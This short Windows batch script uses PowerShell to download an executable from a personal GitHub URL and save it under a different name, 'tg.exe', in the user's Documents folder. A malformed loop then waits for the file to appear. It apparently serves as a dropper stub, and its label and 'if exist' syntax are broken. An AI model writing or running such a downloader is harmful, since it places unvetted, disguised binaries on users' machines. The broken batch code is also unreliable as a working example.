PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\User\Documents\tg.exe'"

:check()
	if "C:\Users\User\Documents\tg.exe" exist (
	
	) else ( 
		goto check
	)